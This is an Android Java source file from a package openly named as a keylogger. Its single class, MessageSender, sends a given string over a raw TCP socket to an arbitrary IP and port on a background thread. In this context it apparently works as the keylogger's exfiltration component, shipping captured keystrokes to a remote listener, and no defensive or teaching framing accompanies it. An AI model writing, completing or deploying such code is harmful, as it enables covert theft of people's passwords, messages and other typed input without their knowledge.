package com.example.keylogger;
import android.util.Log;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MessageSender {
    private static final String TAG = "MessageSender";
    public void sendMessage(String message, String ip, int port) {
        new Thread(() -> {  // Network operations MUST run in a background thread
            try {
                // Validate IP/port (add your own validation logic if needed)
                if (ip == null || ip.isEmpty() || port <= 0) {
                    Log.e(TAG, "Invalid IP/Port: " + ip + ":" + port);
                    return;
                }

                Log.d(TAG, "Attempting connection to: " + ip + ":" + port);

                // Create socket and send data
                Socket socket = new Socket(ip, port);
                PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
                writer.println(message);
                writer.flush();
                writer.close();
                socket.close();

                Log.d(TAG, "Message sent successfully");
            } catch (Exception e) {
                Log.e(TAG, "Connection error: " + e.getMessage());
            }
        }).start();
    }
}